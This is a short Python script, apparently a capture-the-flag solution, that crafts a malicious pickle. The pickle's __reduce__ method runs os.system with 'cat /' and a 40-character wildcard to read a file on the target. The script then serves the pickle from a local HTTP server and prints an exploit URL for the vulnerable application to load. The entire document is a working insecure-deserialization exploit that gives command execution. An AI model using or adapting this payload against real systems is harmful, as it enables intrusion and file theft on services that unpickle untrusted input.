#!/bin/python3

import pickle
import os
import http.server
import socketserver
import random

command = "cat /"+'?'*40


class payload():
    def __reduce__(self):
        return os.system, ("{}".format(command),)


pickle.dump(payload(), open("output.exploit", "wb"))

PORT = random.randint(6000, 9000)

web_dir = os.path.dirname(__file__)
os.chdir(web_dir)

Handler = http.server.SimpleHTTPRequestHandler
httpd = socketserver.TCPServer(("", PORT), Handler)
print("Exploit server running at port", PORT)
try:
    print(f"EXPLOIT URL: http://{httpd.server_address[0]}:{httpd.server_address[1]}/output.exploit")
    httpd.serve_forever()
except Exception:
    httpd.shutdown()

